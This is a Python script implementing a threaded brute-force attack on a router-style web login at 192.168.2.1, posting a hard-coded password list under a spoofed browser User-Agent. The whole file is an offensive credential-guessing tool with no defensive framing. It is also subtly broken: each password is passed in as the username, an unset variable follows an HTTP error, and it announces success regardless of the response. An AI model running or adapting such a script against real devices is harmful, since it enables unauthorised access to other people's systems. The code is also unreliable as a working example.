import urllib3
from urllib import parse, request, error
import time
import threading


class Bruter:

    baseUrl = "http://192.168.2.1/"
    passwords = ["d41d8cd98f00b204e9800998ecf8427e", "ef21cdedfaedfad21124ceff", 312545405042, 454545454212454, 89785212477025]
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
    }
    passwordField = ''
    usernameField = ''
    parameters = {}

    def __init__(self, loginUrl=None, usernameField=None, passwordField=None, parameters={}):
        if loginUrl:
           self.loginUrl = loginUrl
        else:
            self.loginUrl = self.baseUrl + "cgi-bin/login.exe"
        if parameters:
            self.parameters = parameters
        if passwordField:
            self.passwordField = passwordField
        if usernameField:
            self.usernameField = usernameField

    def startBruteforce(self):
        print("[!] Starting brutal force on %s" % self.loginUrl)
        for password in self.passwords:
            time.sleep(1)
            threading.Thread(target=self.attemptLogin, args=[password]).start()

    def attemptLogin(self, username=None, password=None):
        if username:
            self.parameters[self.usernameField] = username
        if password:
            self.parameters[self.passwordField] = password

        parameters = parse.urlencode(self.parameters).encode("utf8")
        request_ = request.Request(self.loginUrl, data=parameters, headers=self.headers, method="POST")

        try:
            print("[>] Trying %s" % self.parameters)
            response = request.urlopen(request_)
            response = response.read()

        except error.HTTPError as e:
            print(str(e.code))
            pass

        print("..and we're in.. \n " + response.decode("utf8"))


if __name__ == '__main__':
    passwordField = "pws"
    bruter = Bruter(passwordField=passwordField)
    bruter.startBruteforce()
    # bruter = Bruter(passwordField=passwordField, parameters={passwordField: 'pienukas'})
    # bruter.attemptLogin(password="penukas")
